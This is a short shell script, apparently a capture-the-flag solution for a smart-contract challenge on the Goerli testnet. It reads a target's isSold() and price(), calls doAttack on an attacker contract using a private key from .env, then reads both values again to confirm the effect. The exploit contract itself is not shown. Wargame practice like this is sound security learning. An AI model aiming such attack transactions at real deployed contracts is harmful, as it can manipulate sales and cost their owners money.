set -o allexport
source ./.env
source ./.env_public
set +o allexport

echo "Before: isSold()"
cast call $TARGET \
    "isSold()(bool)" \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo

echo "Before: price()"
cast call $TARGET \
    "price()(uint256)" \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo

cast send $ATTACK \
    "doAttack(address)" \
    $TARGET \
    --private-key $PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    --confirmations 5
echo

echo "After: isSold()"
cast call $TARGET \
    "isSold()(bool)" \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo

echo "After: price()"
cast call $TARGET \
    "price()(uint256)" \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo
